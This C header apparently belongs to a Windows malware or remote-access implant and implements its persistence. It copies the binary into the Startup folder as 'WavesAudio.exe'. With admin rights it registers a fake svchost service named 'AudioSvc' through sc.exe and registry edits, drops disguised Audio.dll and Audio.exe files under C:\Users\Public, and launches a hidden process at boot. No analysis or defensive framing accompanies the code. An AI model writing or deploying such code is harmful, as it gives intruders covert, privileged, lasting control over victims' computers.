#ifndef PERSIST_INCL
#define PERSIST_INCL
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>
#include "privesc.h"
#include "../utils/winexec.h"
#include "../migrate.h"

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;

DWORD ServiceHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context){
    return NO_ERROR;
}

BOOL svcmain(HMODULE a, DWORD b, LPVOID c){
    if(b == DLL_PROCESS_ATTACH){
        serviceStatusHandle = RegisterServiceCtrlHandler("AudioSvc", (LPHANDLER_FUNCTION)ServiceHandler);
        serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
        serviceStatus.dwServiceSpecificExitCode = 0;
        serviceStatus.dwCurrentState = SERVICE_RUNNING;
        SetServiceStatus(serviceStatusHandle, &serviceStatus);
        
        //i would much rather run from svchost.exe too, but the wininet problem exists in dlls for windows 10, even when svchost hosting
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.wShowWindow = SW_HIDE;
        si.dwFlags = STARTF_USESHOWWINDOW;
        ZeroMemory(&pi, sizeof(pi));
        //may need multiple executes to spawn, the svchost spawns v early in boot process so may be a bit goofy
        while(CreateProcess(NULL, "C:\\Users\\Public\\soundSystem\\Audio.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) == 0) Sleep(5000);
        while(1) Sleep(1000000);
    }
}
void persist_folder(){
    char startpath[MAX_PATH] = { 0 };
    GetEnvironmentVariableA("APPDATA", startpath, MAX_PATH);
    strcat(startpath, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WavesAudio.exe");
    dump2disk(startpath, &main, 0);
}
void persist_svc(){
    if(IsProcessElevated()){
        exec("sc.exe create AudioSvc binPath= \"c:\\windows\\System32\\svchost.exe -k AudioSvcs\" type= share start= auto", NULL, 0);
        exec("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v AudioSvcs /t REG_MULTI_SZ /d AudioSvc /f", NULL, 0);
        CreateDirectoryA("C:\\Users\\Public\\soundSystem", NULL);
        dump2disk("C:\\Users\\Public\\soundSystem\\Audio.dll", &svcmain, 1);
        dump2disk("C:\\Users\\Public\\soundSystem\\Audio.exe", &main, 0);
        exec("reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\AudioSvc\\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\\Users\\Public\\soundSystem\\Audio.dll /f", NULL, 0);
        exec("sc start AudioSvc", NULL, 0);
        if(isChild)
        	ExitThread(0);
        else
            ExitProcess(0);
    }
}
#endif